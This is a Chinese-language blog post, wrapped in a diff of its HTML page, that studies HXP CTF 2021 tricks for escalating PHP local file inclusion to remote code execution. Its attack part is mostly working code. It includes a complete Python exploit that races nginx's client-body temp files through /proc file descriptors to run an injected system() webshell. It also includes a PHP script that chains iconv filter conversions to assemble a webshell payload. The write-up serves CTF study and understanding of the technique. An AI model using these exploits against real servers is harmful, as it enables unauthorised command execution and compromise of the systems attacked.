@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>HXP CTF 2021文件包含到RCE技巧学习 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="HXP CTF 2021 文件包含到RCE技巧学习​    最新看到两个通过文件包含来RCE的题目，感觉挺有意思的。继pearcmd后的另外一种利用方式。简单记录一下。 Trick 1：Nginx客户端主体缓冲区利用源码： 12&lt;?php include_once($_GET[&amp;#x27;file&amp;#x27;]);  ​    利用Nginx提供了一个客户端主体缓冲区，如果客户端主体信息超过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HXP CTF 2021文件包含到RCE技巧学习">
+<meta property="og:url" content="http://example.com/2022/01/07/HXP%20CTF%202021%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B0RCE%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="HXP CTF 2021 文件包含到RCE技巧学习​    最新看到两个通过文件包含来RCE的题目，感觉挺有意思的。继pearcmd后的另外一种利用方式。简单记录一下。 Trick 1：Nginx客户端主体缓冲区利用源码： 12&lt;?php include_once($_GET[&amp;#x27;file&amp;#x27;]);  ​    利用Nginx提供了一个客户端主体缓冲区，如果客户端主体信息超过">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-01-07T02:48:26.000Z">
+<meta property="article:modified_time" content="2022-01-07T02:48:26.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-HXP CTF 2021文件包含到RCE技巧学习" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/01/07/HXP%20CTF%202021%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B0RCE%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/" class="article-date">
+  <time datetime="2022-01-07T02:48:26.000Z" itemprop="datePublished">2022-01-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      HXP CTF 2021文件包含到RCE技巧学习
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="HXP-CTF-2021-文件包含到RCE技巧学习"><a href="#HXP-CTF-2021-文件包含到RCE技巧学习" class="headerlink" title="HXP CTF 2021 文件包含到RCE技巧学习"></a><code>HXP CTF 2021</code> 文件包含到<code>RCE</code>技巧学习</h1><p>​    最新看到两个通过文件包含来<code>RCE</code>的题目，感觉挺有意思的。继<code>pearcmd</code>后的另外一种利用方式。简单记录一下。</p>
+<h2 id="Trick-1：Nginx客户端主体缓冲区利用"><a href="#Trick-1：Nginx客户端主体缓冲区利用" class="headerlink" title="Trick 1：Nginx客户端主体缓冲区利用"></a>Trick 1：<code>Nginx</code>客户端主体缓冲区利用</h2><p>源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include_once($_GET[&#x27;file&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<p>​    利用<code>Nginx</code>提供了一个客户端主体缓冲区，如果客户端主体信息超过了某个阈值的话，<code>Nginx</code>会将全部主体或者部分主体写入到一个临时文件里面。如果<code>Nginx</code>和<code>PHP</code>以相同的用户身份进行运行的话，就可以利用此方式来上传文件，从而达到<code>RCE</code>的目的。</p>
+<p>​    官方解释：<code>https://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Syntax:	client_body_buffer_size size;</span><br><span class="line">Default:	client_body_buffer_size 8k|16k;</span><br><span class="line">Context:	http, server, location</span><br><span class="line"></span><br><span class="line">Sets buffer size for reading client request body. In case the request body is larger than the buffer, the whole body or only its part is written to a temporary file. By default, buffer size is equal to two memory pages. This is 8K on x86, other 32-bit platforms, and x86-64. It is usually 16K on other 64-bit platforms.</span><br></pre></td></tr></table></figure>
+
+<p>​    相关的<code>Nginx</code>的代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ngx_open_tempfile(u_char *name, ngx_uint_t persistent, ngx_uint_t access)</span><br><span class="line">&#123;</span><br><span class="line">    ngx_fd_t  fd;</span><br><span class="line"></span><br><span class="line">    fd = open((const char *) name, O_CREAT|O_EXCL|O_RDWR,</span><br><span class="line">              access ? access : 0600);</span><br><span class="line"></span><br><span class="line">    if (fd != -1 &amp;&amp; !persistent) &#123;</span><br><span class="line">        (void) unlink((const char *) name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    可以发现<code>open</code>了一个文件，然后利用<code>unlink</code>又将文件删除掉。所以，这里存在一个利用方式就是条件竞争。在<code>Linux</code>环境下，我们可以利用<code>procfs</code>来获取一个已被删除文件的引用。</p>
+<p>​    在<code>PHP</code>环境下，利用<code>include</code>函数直接包含<code>/proc/23/fd</code>这种文件，会显示解析的文件不存在路径中，可以利用<code>/proc/self/fd/23/../../../23/fd/</code>这种方式来进行绕过。</p>
+<p>​    <code>poc.py</code>代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import sys, threading, requests</span><br><span class="line"></span><br><span class="line"># exploit PHP local file inclusion (LFI) via nginx assistance (client body buffering)</span><br><span class="line"># see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details</span><br><span class="line"></span><br><span class="line">URL = f&#x27;http://&#123;sys.argv[1]&#125;:&#123;sys.argv[2]&#125;/&#x27;</span><br><span class="line"></span><br><span class="line"># find nginx worker processes</span><br><span class="line">r  = requests.get(URL, params=&#123;</span><br><span class="line">    &#x27;file&#x27;: &#x27;/proc/cpuinfo&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">cpus = r.text.count(&#x27;processor&#x27;)</span><br><span class="line"></span><br><span class="line">r  = requests.get(URL, params=&#123;</span><br><span class="line">    &#x27;file&#x27;: &#x27;/proc/sys/kernel/pid_max&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">pid_max = int(r.text)</span><br><span class="line">print(f&#x27;[*] cpus: &#123;cpus&#125;; pid_max: &#123;pid_max&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">nginx_workers = []</span><br><span class="line">for pid in range(pid_max):</span><br><span class="line">    r  = requests.get(URL, params=&#123;</span><br><span class="line">        &#x27;file&#x27;: f&#x27;/proc/&#123;pid&#125;/cmdline&#x27;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    if b&#x27;nginx: worker process&#x27; in r.content:</span><br><span class="line">        print(f&#x27;[*] nginx worker found: &#123;pid&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">        nginx_workers.append(pid)</span><br><span class="line">        if len(nginx_workers) &gt;= cpus:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">done = False</span><br><span class="line"></span><br><span class="line"># upload a big client body to force nginx to create a /var/lib/nginx/body/$X</span><br><span class="line">def uploader():</span><br><span class="line">    print(&#x27;[+] starting uploader&#x27;)</span><br><span class="line">    while not done:</span><br><span class="line">        requests.get(URL, data=&#x27;&lt;?php system($_GET[&quot;c&quot;]); /*&#x27; + 16*1024*&#x27;A&#x27;)</span><br><span class="line"></span><br><span class="line">for _ in range(16):</span><br><span class="line">    t = threading.Thread(target=uploader)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"># brute force nginx&#x27;s fds to include body files via procfs</span><br><span class="line"># use ../../ to bypass include&#x27;s readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`</span><br><span class="line">def bruter(pid):</span><br><span class="line">    global done</span><br><span class="line"></span><br><span class="line">    while not done:</span><br><span class="line">        print(f&#x27;[+] brute loop restarted: &#123;pid&#125;&#x27;)</span><br><span class="line">        for fd in range(4, 32):</span><br><span class="line">            f = f&#x27;/proc/self/fd/&#123;pid&#125;/../../../&#123;pid&#125;/fd/&#123;fd&#125;&#x27;</span><br><span class="line">            r  = requests.get(URL, params=&#123;</span><br><span class="line">                &#x27;file&#x27;: f,</span><br><span class="line">                &#x27;c&#x27;: f&#x27;id&#x27;</span><br><span class="line">            &#125;)</span><br><span class="line">            if r.text:</span><br><span class="line">                print(f&#x27;[!] &#123;f&#125;: &#123;r.text&#125;&#x27;)</span><br><span class="line">                done = True</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">for pid in nginx_workers:</span><br><span class="line">    a = threading.Thread(target=bruter, args=(pid, ))</span><br><span class="line">    a.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>![image-20220105144508328](HXP CTF 2021 文件包含赛题复现.assets/image-20220105144508328.png)</p>
+<h2 id="Trick-2：iconv编码转换利用"><a href="#Trick-2：iconv编码转换利用" class="headerlink" title="Trick 2：iconv编码转换利用"></a>Trick 2：<code>iconv</code>编码转换利用</h2><p>​    除了直接使用上面的方式进行利用以外，还可以考虑利用伪协议的方式进行利用。在<code>PHP filter</code>过滤器中，有<code>iconv</code>的一个过滤器，它可以将数据从一种编码转换到另外一种编码，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;php://filter/convert.iconv.UTF-8.UTF-7/resource=data:,asdasda&lt;&gt;asd&quot;;</span><br><span class="line">echo file_get_contents($url);</span><br></pre></td></tr></table></figure>
+
+<p>​        在<code>Linux</code>环境下，我们可以通过<code>iconv -l</code>命令来查看支持的字符集。</p>
+<p>![image-20220107093125710](HXP CTF 2021 文件包含赛题复现.assets/image-20220107093125710.png)</p>
+<p>​    其中有一个特殊的编码<code>UTF8.CSISO2022KR</code>，他几乎可以在任何一个字符串前面都增加一串前缀<code>.$)C</code>，例如下面这个示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;php://filter/&quot;;</span><br><span class="line">$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;</span><br><span class="line">$url .= &quot;|convert.base64-decode|convert.base64-encode&quot;;</span><br><span class="line">$url .= &quot;/resource=data://,aaa&quot;;</span><br><span class="line">var_dump(file_get_contents($url));</span><br></pre></td></tr></table></figure>
+
+<p>​    输出的结果为<code>Caaaa</code>，稍微解释一下就是<code>base64-decode</code>会去除掉不合法的字符（不合法是相对<code>base64</code>编码来说的），当我们通过<code>iconv</code>转码之后，会变成有<code>.$)Caaaa</code>，然后利用<code>base64-decode</code>除掉前面三个不合法字符，再<code>encode</code>一下，就看获取到<code>Caaaa</code>。</p>
+<p>​    利用这种方式来进行<code>RCE</code>的一个思路就是利用不同的编码组合和<code>base64-decode</code>的特性，来构造一串恶意字符。下面贴一个<code>payload</code>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$base64_payload = &quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;;</span><br><span class="line">$conversions = array(</span><br><span class="line">    &#x27;R&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;,</span><br><span class="line">    &#x27;B&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;,</span><br><span class="line">    &#x27;C&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR&#x27;,</span><br><span class="line">    &#x27;8&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;,</span><br><span class="line">    &#x27;9&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;,</span><br><span class="line">    &#x27;f&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;,</span><br><span class="line">    &#x27;s&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;,</span><br><span class="line">    &#x27;z&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;,</span><br><span class="line">    &#x27;U&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;,</span><br><span class="line">    &#x27;P&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;,</span><br><span class="line">    &#x27;V&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;,</span><br><span class="line">    &#x27;0&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;,</span><br><span class="line">    &#x27;Y&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;,</span><br><span class="line">    &#x27;W&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;,</span><br><span class="line">    &#x27;d&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;,</span><br><span class="line">    &#x27;D&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;,</span><br><span class="line">    &#x27;7&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;,</span><br><span class="line">    &#x27;4&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$filters = &quot;convert.base64-encode|&quot;;</span><br><span class="line"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br><span class="line">$filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class="line"></span><br><span class="line">foreach (str_split(strrev($base64_payload)) as $c) &#123;</span><br><span class="line">    $filters .= $conversions[$c] . &quot;|&quot;;</span><br><span class="line">    $filters .= &quot;convert.base64-decode|&quot;;</span><br><span class="line">    $filters .= &quot;convert.base64-encode|&quot;;</span><br><span class="line">    $filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$filters .= &quot;convert.base64-decode&quot;;</span><br><span class="line"></span><br><span class="line">$final_payload = &quot;php://filter/&#123;$filters&#125;/resource=data://,aaaaa&quot;;</span><br><span class="line"></span><br><span class="line">// echo $final_payload;</span><br><span class="line">var_dump(file_get_contents($final_payload));</span><br></pre></td></tr></table></figure>
+
+<p>​    仔细看一下脚本内容，可以发现我们是从后往前进行解析的，通过不断地拼接，<code>decode</code>最后就可以构造恶意<code>payload</code>。</p>
+<p>​    但是该方式存在一定的局限性，我在两台不同的<code>Linux</code>主机上进行尝试，都没有成功。这应该是编码的问题，下面有师傅写的<code>fuzz</code>脚本，建议在利用这个技巧的时候，在与目标相同环境下，运行一下<code>fuzz</code>脚本，来获取特定的组合：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/blob/main/fuzzer.php">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/blob/main/fuzzer.php</a></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://bierbaumer.net/security/php-lfi-with-nginx-assistance/">https://bierbaumer.net/security/php-lfi-with-nginx-assistance/</a></p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p>
+<p><a target="_blank" rel="noopener" href="https://gynvael.coldwind.pl/?id=671">https://gynvael.coldwind.pl/?id=671</a></p>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/01/07/HXP%20CTF%202021%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B0RCE%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/" data-id="cl8h1i72f00010bdp1si9gsqx" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/01/13/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&POC%E7%BC%96%E5%86%99/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          JDBC反序列化漏洞分析&amp;POC编写
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/12/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---%E6%B9%96%E6%B9%98%E6%9D%AF2021-Pastebin%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">前端安全---湖湘杯2021-Pastebin复现学习</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">xxe外部实体注入漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/">WordPress SQL注入漏洞（CVE-2022-21661分析与复现）</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/">Java安全---JNDI注入解析</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/">Java CC链1-5分析与总结</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/11/RWCTF%204th%20Desperate%20Cat%20%E8%B5%9B%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/">RWCTF 4th Desperate Cat 赛题学习与复现</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
